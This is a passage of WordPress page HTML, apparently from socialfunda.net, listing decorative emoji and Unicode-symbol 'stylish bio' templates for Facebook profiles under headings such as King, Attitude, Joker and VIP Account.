+
+<p class="has-text-align-center">◢◣<br>◢◤✦◥◣<br>◢◤✦◥◣<br>⚅⚅⚅༗ᏦᎥᏁᏀ༗⚅⚅⚅<br>✦✦✦✦✦✦✦<br>✦✦✦✦✦<br>✦✦✦<br>✦✦✦<br>✦✦✦✦✦<br>✦✦✦✦✦✦✦<br>⚅⚅⚅⚅✦⚅⚅⚅⚅<br>◢◤✦◥◣<br>◢◤✦✦✦◥◣<br>◢◤✦✦✦✦✦◥◣<br>◢◤◢◤✦✦✦◥◣◥◣</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_32d0ac-8d"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_de4427-33 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_de4427-33"><span class="ez-toc-section" id="Facebook_Stylish_Bio_Crazzy_Boys"></span>Facebook Stylish Bio Crazzy Boys<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_8660b6-13 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_216da9-41 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">◥▔◣◢☬◣◈◢☬◣◢▔◤<br>█<br>◢◤♦️◥◣ ◢◤♦️◥◣ ◢◤♦️◥◣<br>♦️◈⚀ ★❍KAMINA BOY ❍★⚀◈<br>◥◣🔷◢◤ ◥◣🔴◢◤ ◥◣🔷◢◤<br>█<br>◢▂◤◥☬◤◈◥☬◤◥▂◣</p>
+
+
+
+<p class="has-text-align-center">◁━━━━◈✙◈━━━━▷<br>◈✙◈✙◈✙◈<br>◆◇◇◆<br>◈◈<br>●<br>●<br>☆☆KHELADI ☆☆<br>●<br>●<br>◈◈<br>◆◇◇◆<br>◈✙◈✙◈✙◈<br>◁━━━━◈✙◈━━━━▷</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_a648bf-58"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_d0c57c-42 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_d0c57c-42"><span class="ez-toc-section" id="Facebook_Stylish_Bio_Text_Hindi"></span>Facebook Stylish Bio Text Hindi<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+
+<div class="wp-block-kadence-image kb-image76_04da8c-35"><figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="197" height="350" src="https://socialfunda.net/wp-content/uploads/2023/02/8-custom-3.webp" alt="Facebook Stylish Bio" class="kb-img wp-image-448" title="Facebook Stylish Bio" srcset="https://socialfunda.net/wp-content/uploads/2023/02/8-custom-3.webp 197w, https://socialfunda.net/wp-content/uploads/2023/02/8-custom-3-169x300.webp 169w" sizes="auto, (max-width: 197px) 100vw, 197px" /></figure></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_d71f4b-12 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_d3c0ef-0d inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">😜Only♦ Moj🥰<br>💔Hearking❣️<br>☺️My♦ Name♦ You♦ Alway♦ Knows😁<br>🏍️KTM♦ Lover💘<br>🇮🇳Indian🇮🇳<br>🔴👉Pro♦ Life😎<br>😘I♦ Love♦ My♦ Friends👬<br>💖RAJKOT<br>🙂First♦ Crush♦ My♦ Mom👩</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_359eb7-0d"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_7afb85-b8 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_7afb85-b8"><span class="ez-toc-section" id="Facebook_Stylish_Bio_Girl"></span>Facebook Stylish Bio Girl<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_6244a2-b9 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_f01063-b0 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">🔱🟣🟣🟣🔱<br>◥██◤<br>◥█◤<br>◥◤<br>⚜️━━━•🔥•━━━⚜️<br>◢█◣<br>◢███◣<br>⫷▓▓▓(🕉️)▓▓▓⫸<br>◥███◤<br>◥█◤<br>🔱━━━•🔥•━━━🔱<br>◢◣<br>◢█◣<br>◢██◣<br>🔱🟠🟠🟠🔱</p>
+
+
+
+<p class="has-text-align-center">┏━━━━━•°<em>🔥</em>°•━━━━━┓<br>◈★◈<br>◈<br>◈★◈<br>⟣⃟⸻⚀🌟༻⭐༺🌟⚀⸻⃟⟢<br>◈★◈<br>💢FB. KING 💢<br>◈★◈<br>⟣⃟⸻⚀🌟༻⭐༺🌟⚀⸻⃟⟢<br>◈★◈<br>◈<br>◈★◈<br>┗━━━━━•°<em>🔥</em>°•━━━━━┛</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_dc65a9-21"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_237828-95 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_237828-95"><span class="ez-toc-section" id="Facebook_Stylish_Bio_New"></span>Facebook Stylish Bio New<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_03a885-0d alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_c22b92-f8 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">🔴🔴❖♥️❖🔴🔴<br>❤️❖❤️<br>╔━━❖❖♥❖❖━━╗<br>⭕KiNg is here⭕<br>╚━━❖❖♥❖❖━━╝<br>❤️❖❤️<br>🔴🔴❖♥️❖🔴🔴</p>
+
+
+
+<p class="has-text-align-center">╭──────•◈•──────╮<br>◢◣<br>◢◤◇◥◣<br>◥◣◇◢◤<br>◥◤<br>▇▇▇▇▇▇▇▇▇▇<br>●FB.King●<br>▇▇▇▇▇▇▇▇▇▇<br>◢◣<br>◢◤◇◥◣<br>◥◣◇◢◤<br>◥◤<br>╰──────•◈•─────╯</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_b7d9c5-d1"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_f3d042-d8 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_f3d042-d8"><span class="ez-toc-section" id="Facebook_Stylish_Bio_Dead"></span>Facebook Stylish Bio Dead<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+
+<div class="wp-block-kadence-image kb-image76_ca92e2-46"><figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="197" height="350" src="https://socialfunda.net/wp-content/uploads/2023/02/9-custom-2.webp" alt="Facebook Stylish Bio" class="kb-img wp-image-449" title="Facebook Stylish Bio" srcset="https://socialfunda.net/wp-content/uploads/2023/02/9-custom-2.webp 197w, https://socialfunda.net/wp-content/uploads/2023/02/9-custom-2-169x300.webp 169w" sizes="auto, (max-width: 197px) 100vw, 197px" /></figure></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_0c15e5-ac alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_8e66f0-a4 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">♦<br>꧁◥◣♦️◢◤꧂<br>꧁♦️⛓♦⛓♦️꧂<br>꧁♦️Kheladi♦️꧂<br>꧁♦️⛓♦⛓♦️꧂<br>꧁◥◣♦️◢◤꧂<br>♦<br>♦🖤♦<br>◆◆◆◆◆◆◆◆◆<br>♠️♠️💙♠️♠️</p>
+
+
+
+<p class="has-text-align-center">✳▇▇☆🔸☆▇▇✳<br>█<br>◥◣★◢◤<br>◥◤<br>◥▔◣◢✴◣◈◢✴◣◢▔◤<br>✳◈◈🔘 ★❍ █<br>█<br>█<br>█<br>◥◣★◢◤<br>◥◤<br>◥▔◣◢✳◣◈◢✳◣◢▔◤<br>🔴🔷🔶💗 ★❍ Yᵒᵘ ❍★💗🔶🔷🔴</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_697450-8b"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_be7693-6a wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_be7693-6a"><span class="ez-toc-section" id="Facebook_Stylish_Bio_King"></span>Facebook Stylish Bio King<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_10cb07-70 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_1bdb46-1c inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">💙<br>🖤🖤✿❤️❤️<br>🧡❤️💙🖤💛<br>༒༒༒༒༒༒<br>,•’“’•,•’“’•,<br>’•,❤ •’<br>’•,,•’<br>༒༒༒༒༒༒<br>🧡❤️💙🖤💛<br>🖤🖤✿❤️❤️<br>💙</p>
+
+
+
+<p class="has-text-align-center">◢◣<br>◢◣★◢◣<br>█<br>██<br>████<br>◢█◈★◈■⚀■◈★◈█◣<br>⫷▓▓▓(✴ ✴)▓▓▓⫸<br>◥█◈★◈■⚀■◈★◈█◤<br>████<br>██<br>█<br>◥◤★◥◤<br>◥◤</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_ea62a7-c4"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_03e9ae-7b wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_03e9ae-7b"><span class="ez-toc-section" id="Bio_Text_Copy_and_Paste_for_Girl"></span>Bio Text Copy and Paste for Girl<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_9dd092-eb alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_d0f799-65 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">◢▇◣◢▇◣<br>▇▇▇▇▇▇<br>◥▇▇▇▇◤<br>◥▇▇◤<br>◥◤<br>◢◣<br>◢◤♦️◥◣<br>🖤♜◀Bad Boy▶♜️🖤<br>◥◣◥◣♜◢◤◢◤<br>◥◤<br>◢♦️◣</p>
+
+
+
+<p class="has-text-align-center">༒◥█◣۩ஐ▚❤▞ஐ۩◢█◤༒<br>◥◣♦️◢◤<br>♦️◈⚀ ★❍ 13 Yarr ❍★⚀◈♦️<br>◢◤♦️◥◣<br>༒◥█◣۩ஐ▚❤▞ஐ۩◢█◤༒</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_e762dd-d4"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_04fe86-f1 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_04fe86-f1"><span class="ez-toc-section" id="Best_Facebook_Stylish_Bio"></span>Best Facebook Stylish Bio<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+
+<div class="wp-block-kadence-image kb-image76_d67b5e-b0"><figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="197" height="350" src="https://socialfunda.net/wp-content/uploads/2023/02/10-custom-3.webp" alt="Facebook Stylish Bio" class="kb-img wp-image-450" title="Facebook Stylish Bio" srcset="https://socialfunda.net/wp-content/uploads/2023/02/10-custom-3.webp 197w, https://socialfunda.net/wp-content/uploads/2023/02/10-custom-3-169x300.webp 169w" sizes="auto, (max-width: 197px) 100vw, 197px" /></figure></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_9fa7e4-72 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_618f96-51 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">🖤◢◣◢◣♚️◢◣◢◣🖤<br>♛◀V.I.P▶♚<br>💓<br>◢▇◣◢▇◣<br>▇▇▇▇▇▇<br>◥▇▇▇▇◤<br>◥▇▇◤<br>◥◤<br>◢◣<br>◢◤♦️◥◣<br>🖤♜◀Bad Boy▶♜️🖤<br>◥◣◥◣♜◢◤◢◤<br>◥◤</p>
+
+
+
+<p class="has-text-align-center">██████<br>█████<br>█🔻🔻🔻🔻🔻🔻🔻🔻<br>█☣☣☣☣☣☣☣☣<br>███████████<br>┏━━━━█━━━━┓<br>┗▒▣🎸🎸🎸🎸▣▒┛<br>███████████<br>█☣☣☣☣☣☣☣☣<br>█🔺🔻🔻🔻🔻🔻🔻🔻<br>█████<br>██████</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_c55e6f-cf"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_d4033a-98 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_d4033a-98"><span class="ez-toc-section" id="Facebook_Stylish_Bio_Attitude"></span>Facebook Stylish Bio Attitude<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_7c323b-3f alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_5ee74b-50 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">◢◣<br>◥♦️◤<br>◣◥♦◤◢<br>★<br>༒◥█◣▃▚💜▞▃◢█◤༒<br>◥◣⚀◢◤<br>★✤✤ ♡KING♡ ✤✤★<br>◢◤⚀◥◣<br>༒◥█◣▃▚💜▞▃◢█◤༒<br>◥◣♦️◢◤<br>◥◣◥◣★◢◤◢◤<br>◥◣◣◢◢◤<br>◥◣ ★ ◢◤</p>
+
+
+
+<p class="has-text-align-center">☢━━━━━━💛🌹💛━━━━━━☢<br>🥇<br>◢◣<br>◢◤♥◥◣<br>◥◣♥◢◤<br>◥◤<br>◢◣<br>💕🌹💕<br>◥◤<br>◢◣<br>◢◤♦◥◣<br>◥◣♦◢◤<br>◥◤<br>☢━━━━━━💛☫💛━━━━━━☢</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_3f640b-2b"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_201a70-7c wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_201a70-7c"><span class="ez-toc-section" id="Latest_Facebook_Stylish_Bio"></span>Latest Facebook Stylish Bio<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_8867d0-65 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_58a225-df inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">💜❖❖❖<br>💜❖❖❖<br>💜❖❖<br>💜❖<br>❖💜<br>♦️❖💜<br>♦️❖❖💜<br>♦️❖❖❖💜<br>♦️❖❖❖💜<br>♦️❖❖💜<br>♦️❖💜<br>♦️❖💜<br>❖💜♦️</p>
+
+
+
+<p class="has-text-align-center">◥⚚◤<br>◥⚚◤<br>◥⚚◤<br>◥⚚◤<br>╱◣◥◤◢╲<br>◥✺◣◢✺◣♛◢✺◣◢✺◤<br>😁 Cute Kameena 😎<br>◢✺◤◥✺◤♛◥✺◤◥✺◣<br>╲◣◥◤◢╱<br>◥⚚◤<br>◥⚚◤<br>◥⚚◤<br>◥⚚◤<br>◥⚚◤</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_66ca36-7d"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_f3f4db-7e wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_f3f4db-7e"><span class="ez-toc-section" id="Facebook_Stylish_Bio_Shayari"></span>Facebook Stylish Bio Shayari<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+
+<div class="wp-block-kadence-image kb-image76_b7dbe7-f0"><figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="197" height="350" src="https://socialfunda.net/wp-content/uploads/2023/02/11-custom-2.webp" alt="Facebook Stylish Bio" class="kb-img wp-image-451" title="Facebook Stylish Bio" srcset="https://socialfunda.net/wp-content/uploads/2023/02/11-custom-2.webp 197w, https://socialfunda.net/wp-content/uploads/2023/02/11-custom-2-169x300.webp 169w" sizes="auto, (max-width: 197px) 100vw, 197px" /></figure></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_7e8ab8-5f alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_c4b81e-9e inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">⚀☆●☆●☆●☆●☆⚀<br>◢◣<br>◢◤☆◥◣<br>◥◣☆◢◤<br>◥◤<br>⚃❍❍❖❍❍⚃<br>●•Alone Lover •●<br>⚃❍❍❖❍❍⚃<br>◢◣<br>◢◤☆◥◣<br>◥◣☆◢◤<br>◥◤<br>⚀☆●☆●☆●☆●☆⚀</p>
+
+
+
+<p class="has-text-align-center">◥❤️◤<br>❖<br>╱◣◢╲<br>◥▔◣❤️◣◈◢❤️◢▔◤<br>❤️ ★★ ❤️<br>◢▂◥❤️◤◈◥❤️◥▂◣<br>◢◤◥◣<br>◥❤️◤<br>◣★◢</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_7a7e29-45"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_631447-57 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_631447-57"><span class="ez-toc-section" id="Profile_Facebook_Stylish_Bio_Text"></span>Profile Facebook Stylish Bio Text<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_a8bdff-de alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_518ac8-65 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">🕉️❁❤️❮⃝⃟⃝❰❤️❁🕉️<br>❁❁❁❁❁<br>❁❁❁❁<br>❁❁❁<br>❁❁<br>❁</p>
+
+
+
+<p class="has-text-align-center">◢♦️◣<br>♥️♥️<br>♦️❖♦️<br>╱◣★◢╲<br>◣❖◢<br>♦️❖★Bad Boy★❖♦️<br>◤❖◥<br>◢◤★◥◣<br>♦️❖♦️<br>♥️♥️<br>♦️</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_73d6ed-6c"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_582622-16 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_582622-16"><span class="ez-toc-section" id="Facebook_Stylish_Bio_Symbols_Copy_and_Paste"></span>Facebook Stylish Bio Symbols Copy and Paste<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_e2a220-ed alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_b9e836-50 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">❖♥️❖<br>♦️<br>♦️<br>♦️<br>♦️​❖♦️❖♦️❖♦️<br>╔━━❖❖❖❖━━╗<br>👑Badshah👑<br>╚━━❖❖❖ ❖━━╝<br>♦️​❖♦️❖♦️❖♦️<br>♦️<br>♦️♦️<br>♦️<br>❖♥️❖</p>
+
+
+
+<p class="has-text-align-center">◢◤♦️◥◣<br>◥◣💠◢◤<br>༺۝❉{ ● KING ● }❉۝༻<br>❖ ──🎲── ❖<br>❖─☸♦♦☸─❖<br>❖─♦️ ☸ ♦️─❖<br>❖─☸♦♦☸─❖<br>❖ ──🎲── ❖<br>◢◤💠◥◣<br>◥◣♦️◢◤<br>◥◤<br>🎲🕳️🔵🔵🔵🔵🔵🔵🔵🕳️🎲</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_ba41db-5f"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_1bcb50-c5 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_1bcb50-c5"><span class="ez-toc-section" id="Facebook_Stylish_Bio_Joker"></span>Facebook Stylish Bio Joker<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+
+<div class="wp-block-kadence-image kb-image76_8be52e-b5"><figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="197" height="350" src="https://socialfunda.net/wp-content/uploads/2023/02/12-custom-2.webp" alt="Facebook Stylish Bio" class="kb-img wp-image-452" title="Facebook Stylish Bio" srcset="https://socialfunda.net/wp-content/uploads/2023/02/12-custom-2.webp 197w, https://socialfunda.net/wp-content/uploads/2023/02/12-custom-2-169x300.webp 169w" sizes="auto, (max-width: 197px) 100vw, 197px" /></figure></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_3ba19a-93 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_49de77-85 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">❖♥️❖<br>♦️<br>♦️<br>♦️<br>♦️​❖♦️❖♦️❖♦️<br>╔━━❖❖❖❖━━╗<br>👑Badshah👑<br>╚━━❖❖❖ ❖━━╝<br>♦️​❖♦️❖♦️❖♦️<br>♦️<br>♦️♦️<br>♦️<br>❖♥️❖</p>
+
+
+
+<p class="has-text-align-center">◢◤♦️◥◣<br>◥◣💠◢◤<br>༺۝❉{ ● KING ● }❉۝༻<br>❖ ──🎲── ❖<br>❖─☸♦♦☸─❖<br>❖─♦️ ☸ ♦️─❖<br>❖─☸♦♦☸─❖<br>❖ ──🎲── ❖<br>◢◤💠◥◣<br>◥◣♦️◢◤<br>◥◤<br>🎲🕳️🔵🔵🔵🔵🔵🔵🔵🕳️🎲</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_d0077e-a2"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_7e3a46-15 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_7e3a46-15"><span class="ez-toc-section" id="Facebook_Stylish_Bio_for_VIP_Account"></span>Facebook Stylish Bio for VIP Account<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_477daf-3f alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_bebe42-6d inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">◢◣<br>◢◤💟◥◣<br>◥◣🕉️◢◤<br>◥◣◥◣★◢◤◢◤<br>◥▔◣◢☬◣◈◢☬◣◢▔◤<br>꧁⭕🅺🅸🅽🅶⭕꧂<br>◢▂◤◥☬◤◈◥☬◤◥▂◣<br>◥◣◥◣★◢◤◢◤<br>◢◤🕉️◥◣<br>◥◣💟◢◤<br>◥◤</p>
+
+
+
+<p class="has-text-align-center">♥♥♥♥♥♥♥♥<br>▅▅▅▅▅▅▅▅▅▅▅<br>▅▅▅▅▅▅▅▅<br>▅▅▅▅▅▅<br>▅▅▅▅<br>◥◤<br>★❍TERA BAAP★<br>◢◣<br>▅▅▅▅<br>▅▅▅▅▅▅<br>▅▅▅▅▅▅▅▅<br>▅▅▅▅▅▅▅▅▅▅▅<br>♥♥♥♥♥♥♥♥</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_9df4ef-34"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_41c526-82 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_41c526-82"><span class="ez-toc-section" id="Facebook_Stylish_Bio_Photo"></span>Facebook Stylish Bio Photo<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_1be5ab-13 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_c52a93-cd inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">❤▞༻༺▞❤<br>❈-❈-❈-❈-❈-❈<br>❈-❈-❈-❈-❈<br>❈-❈-❈-❈<br>❈-❈-❈<br>❈-❈<br>❈</p>
+
+
+
+<p class="has-text-align-center">◢◣<br>◢◤❀◥◣<br>◥◣☸◢◤<br>◥◣◥◣★◢◤◢◤<br>❖─☸☸─❖<br>◥▔◣◢☬◣◈◢☬◣◢▔◤<br>✮☆ᏝᎧᏉᏋ☆✮<br>◢▂◤◥☬◤◈◥☬◤◥▂◣<br>❖─☸☸─❖<br>◥◣◥◣★◢◤◢◤<br>◢◤☸◥◣<br>◥◣❀◢◤<br>◥◤</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_a41c73-ab"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_3c84c4-b5 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_3c84c4-b5"><span class="ez-toc-section" id="VIP_Facebook_Stylish_Bio"></span>VIP Facebook Stylish Bio<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+
+<div class="wp-block-kadence-image kb-image76_69602a-dd"><figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="197" height="350" src="https://socialfunda.net/wp-content/uploads/2023/02/13-custom-1.webp" alt="Facebook Stylish Bio" class="kb-img wp-image-453" title="Facebook Stylish Bio" srcset="https://socialfunda.net/wp-content/uploads/2023/02/13-custom-1.webp 197w, https://socialfunda.net/wp-content/uploads/2023/02/13-custom-1-169x300.webp 169w" sizes="auto, (max-width: 197px) 100vw, 197px" /></figure></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_845c64-bd alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_ea662c-51 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">♦️♦️♦️<br>♦️🎇⚏⚏⚏🎡⚏⚏⚏🎇♦️<br>♦️🎇⚏⚏🎡⚏⚏🎇♦️<br>♦️🎇⚏🎡⚏🎇♦️<br>♦️💑Ek💜13💙Ek mere💑♦️<br>♦️🎇⚏🎡⚏🎇♦️<br>♦️🎇⚏⚏🎡⚏⚏🎇♦️<br>♦️🎇⚏⚏⚏🎡⚏⚏⚏🎇♦️<br>♦️♦️♦️</p>
+
+
+
+<p class="has-text-align-center">╱╲<br>│⬛│<br>│🟪│<br>│🟩│<br>│🟥│<br>│🟧│<br>│🟨│<br>│⬛│<br>◢███◣<br>꧁█⚅█BAD█⚅█꧂<br>꧁█⚅█BOY█⚅█꧂<br>◥███◤<br>██<br>██<br>◥█◤</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_ff3b51-62"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_9399b2-3d wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_9399b2-3d"><span class="ez-toc-section" id="New_Facebook_Stylish_Bio"></span>New Facebook Stylish Bio<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_5b90ea-85 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_e864d0-95 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">💚✿✿✿<br>💜✿✿✿<br>❤️✿✿<br>🖤✿<br>✿🧡<br>༒✿♥️<br>༒✿✿💜<br>༒✿✿✿💚<br>༒✿✿✿💛<br>༒✿✿🤎<br>༒✿🖤<br>༒✿</p>
+
+
+
